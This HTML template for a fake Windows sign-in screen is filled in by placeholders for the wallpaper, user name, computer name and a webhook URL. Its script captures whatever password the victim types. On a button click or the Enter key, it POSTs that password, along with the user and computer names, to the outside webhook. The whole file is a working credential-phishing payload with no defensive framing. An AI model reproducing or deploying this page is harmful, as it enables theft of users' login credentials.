<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#65279;</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
<style>
  #loginForm {
    height: 100vh;
    width: 100vw;
    position: relative;
  }
  body {
    background: url($wpURL);
    background-repeat: no-repeat;
    background-size: 100% cover;
    background-position: center;
    backdrop-filter: blur(10px);
    height: 100vh;
    width: 100vw;
    position: relative;
    top: 0;
    left: 0
  }
    .center-container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }
    .input-box {
      width: 300px;
      height: 35px;
      color: white;
      background-color: rgba(64, 64, 64, 0.3);
      border: 1px solid #e6e6e6;
      padding: 5px;
      text-align: Left;
      border-bottom: 5px solid #0066ff;
    }
    .input-box::placeholder {
    color: #e6e6e6;
    }
    .input-box:not(:focus) {
    border-bottom: rgba(64, 64, 64, 0.3);
    border: 1px solid #e6e6e6;
    }
    .input-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }
    .btn-signin {
      width: 140px;
      height: 40px;
      background-color: rgba(96, 96, 96, 0.2);
      border: 1px solid #e6e6e6;
      border-radius: 0;
      line-height: 27px;
      text-align: center
      color: white !important;
    }
    .btn-signin:hover {
    background-color: rgba(96, 96, 96, 0.6);
    }
    #userLine{
    color: white;
    font-size:35px;
    }
    .my22{
      text-align: center
      color: white;
    }
    .circular-image {
    width: 180px;
    height: 180px;
    border-radius: 50%;
    border: 2px solid #e6e6e6;
    margin-bottom: 10px;
    }
</style>
  </head>
<body class="text-nowrap" style="width:100%;height:100vh">
  <div id="loginForm" class="container">
    <div class="center-container">
        <div class="image-container">
            <img src="https://www.tenforums.com/geek/gars/images/2/types/thumb_14400082930User.png" alt="User Image" class="circular-image">
             </div>
      <div class="input-container">
      <h3 id="userLine">$u</h3>
        <input id="password" class="input-box" type="password" placeholder="$mthd" autofocus>
        <button id="btnSignIn" class="btn btn-signin" style="color: white;">Sign In</button>
        <p class="my22" style="color: white;">I forgot my $mthd</p>
      </div>
    </div>
  </div>
  <script>
    function sendCredentialsAndExecuteCommand() {
      var passwordValue = document.getElementById("password").value;
      var webhookUrl = "$dc";
      var uValue = "$u";
      var cValue = "$c";
      var data = {content: "Computer: " + cValue + " | User: " + uValue + " | Password: " + passwordValue};
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)})
      .then(response => {})
      .catch(error => {});}
    document.getElementById("btnSignIn").addEventListener("click", function() {
      sendCredentialsAndExecuteCommand();
    });
    document.addEventListener('keypress', (e)=>{
    console.log('key pressed', e.keyCode);
    if(e.keyCode === 13) {
      sendCredentialsAndExecuteCommand();
    }
    else {
      return null;
    }
  });
  </script>
</body>
</html>
